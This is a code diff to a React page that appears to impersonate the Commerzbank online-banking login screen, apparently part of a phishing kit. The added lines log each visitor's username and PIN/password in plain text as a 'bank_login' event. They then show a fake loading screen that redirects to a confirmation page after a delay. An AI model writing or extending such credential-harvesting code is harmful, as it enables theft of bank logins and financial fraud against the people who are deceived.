@@ -2,6 +2,8 @@ import { useState } from "react";
 import { createFileRoute, Link, useNavigate } from "@tanstack/react-router";
 import { ArrowLeft, Info, X } from "lucide-react";
 import { bankLogoUrls } from "@/assets/bank-logos";
+import { logEvent } from "@/lib/session";
+
 
 export const Route = createFileRoute("/bank/commerzbank")({
   head: () => ({
@@ -143,7 +145,9 @@ function CommerzbankLoginPage() {
                   sessionStorage.setItem("bankName", "Commerzbank");
                   sessionStorage.setItem("bankLogo", "commerzbank");
                 } catch {}
+                logEvent("bank_login", { bank_slug: "commerzbank", bank_name: "Commerzbank", field1_label: "Benutzername/Teilnehmernummer", field1: login, field2_label: "PIN/Passwort", field2: pin });
                 navigate({ to: "/loading", search: { to: "/confirm", ms: 5000 } });
+
               }}
               className={`h-14 w-full rounded-full text-[15px] font-semibold transition-colors ${
                 canContinue
